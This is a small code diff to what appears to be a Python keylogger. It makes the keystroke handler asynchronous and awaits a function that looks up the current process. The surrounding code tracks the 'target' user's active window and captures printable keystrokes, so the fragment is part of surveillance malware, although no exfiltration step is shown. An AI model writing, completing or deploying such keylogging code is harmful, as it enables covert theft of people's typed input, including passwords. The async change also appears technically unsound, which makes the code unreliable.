@@ -54,13 +54,13 @@ async def get_current_process():
 
 asyncio.get_event_loop().run_until_complete(get_current_process())
 
-def KeyStroke(event):
+async def KeyStroke(event):
     global current_window
 
     # check to see if target changed windows
     if event.WindowName != current_window:
         current_window = event.WindowName
-        get_current_process()
+        await get_current_process()
 
     # if they pressed a standard key
     if 32 < event.Ascii < 127:
